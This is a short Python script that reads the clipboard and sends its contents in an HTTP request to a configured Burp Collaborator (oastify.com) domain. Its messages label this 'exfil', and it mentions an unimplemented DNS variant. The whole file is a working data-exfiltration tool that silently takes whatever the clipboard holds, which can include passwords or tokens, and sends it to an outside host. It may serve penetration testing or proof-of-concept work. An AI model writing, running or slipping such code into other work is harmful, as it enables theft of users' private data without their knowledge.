import pyperclip
import requests

# === CONFIG ===
BURP_COLLABORATOR_DOMAIN = "yegel82nhokfcjj5nc3vixgwpnvhj87x.oastify.com"
USE_HTTP = True

def send_via_http(data):
    try:
        url = f"http://{BURP_COLLABORATOR_DOMAIN}/?q={data}"
        print(f"[+] Sending to: {url}")
        response = requests.get(url, timeout=5)
        print(f"[+] Sent via HTTP, status: {response.status_code}")
    except Exception as e:
        print(f"[!] HTTP exfil failed: {e}")

def main():
    clipboard_data = pyperclip.paste().strip()
    if not clipboard_data:
        print("[!] Clipboard is empty.")
        return

    print(f"[+] Clipboard data: {clipboard_data}")

    if USE_HTTP:
        send_via_http(clipboard_data)
    else:
        print("[!] DNS exfil not implemented.")

if __name__ == "__main__":
    main()
